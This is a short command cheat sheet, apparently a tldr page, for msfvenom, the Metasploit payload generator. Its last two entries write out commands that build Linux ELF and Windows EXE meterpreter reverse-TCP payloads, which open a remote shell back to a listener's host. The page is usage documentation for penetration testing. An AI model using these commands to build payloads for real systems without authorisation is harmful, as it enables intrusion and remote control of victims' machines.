# msfvenom

> Manually generate payloads for metasploit.
> More information: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- List Payloads:

`msfvenom -l payloads`

- List formats:

`msfvenom -l formats`

- Show payload options:

`msfvenom -p {{payload}} --list-options`

- Create an elf with a reverse tcp handler:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf > reverseTcpElf`

- Create an exe with a reverse tcp handler:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe > reverseTcp.exe`

